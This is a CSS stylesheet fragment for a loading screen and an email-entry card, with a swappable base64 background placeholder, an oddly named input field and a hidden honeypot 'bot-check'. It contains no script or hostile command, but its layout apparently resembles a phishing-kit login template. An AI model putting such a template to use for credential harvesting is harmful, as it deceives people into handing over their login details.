    <style>
        /* Reset styles */
        body,
        html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        /* Section visibility controls */
        .section {
            display: none;
            width: 100%;
            height: 100vh;
            position: absolute;
            top: 0;
            left: 0;
        }

        .section.active {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Loading section styles */
        .loading-container {
            position: relative;
            text-align: center;
        }

        .progress-bar {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            height: 4px;
            width: 214px;
            background: #eaeaea;
            top: calc(50% + 30px);
        }

        .progress-bar-inner {
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 0%;
            background: #61a4f6;
            transition: width 0.5s ease-in-out;
        }

        .loading-logo {
            position: absolute;
            top: 50%;
            left: 50%;
            height: 33px;
            width: 120px;
            transform: translate(-50%, -50%);
        }

        /* Email entry section styles */
        .email-container {
            background-image: url('data:image/png;base64,BACKGROUND_TEMPLATE_BASE64_PLACEHOLDER');
            background-size: cover;
            background-position: center;
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 2rem;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            position: relative;
        }

        .email-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.3);
            backdrop-filter: blur(1px);
            border-radius: 8px;
            z-index: -1;
        }

        .email-container img {
            width: 150px;
            margin-bottom: 1rem;
        }

        .email-container h3 {
            font-size: 1.2rem;
            margin-bottom: 0.5rem;
            color: #333;
        }

        .email-container p {
            margin-bottom: 0.5rem;
            color: #666;
            font-size: 0.85rem;
            line-height: 1.5;
        }

        #email-form {
            width: 100%;
        }

        #thesupwillsup-input {
            width: 100%;
            padding: 0.5rem;
            margin: 0.5rem 0;
            border: 2px solid #e2e8f0;
            border-radius: 6px;
            font-size: 0.9rem;
            box-sizing: border-box;
            transition: border-color 0.2s ease;
        }

        #thesupwillsup-input:focus {
            outline: none;
            border-color: #04731a;
            box-shadow: 0 0 0 3px rgba(4, 115, 26, 0.1);
        }

        #continue-button {
            width: 100%;
            padding: 0.5rem;
            background-color: #130032;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        #continue-button:hover {
            background-color: #351E58;
            transform: translateY(-1px);
        }

        .bot-check {
            position: absolute;
            left: -9999px;
            opacity: 0;
            visibility: hidden;
        }

        .verification-failed {
            color: #dc2626;
            display: none;
            margin-top: 0.5rem;
            font-size: 0.75rem;
            padding: 0.5rem;
            background-color: #fef2f2;
            border-radius: 4px;
            border: 1px solid #fee2e2;
        }

        .footer {
            font-size: 0.65rem;
            color: #6b7280;
            margin-top: 1rem;
            line-height: 1.4;
        }
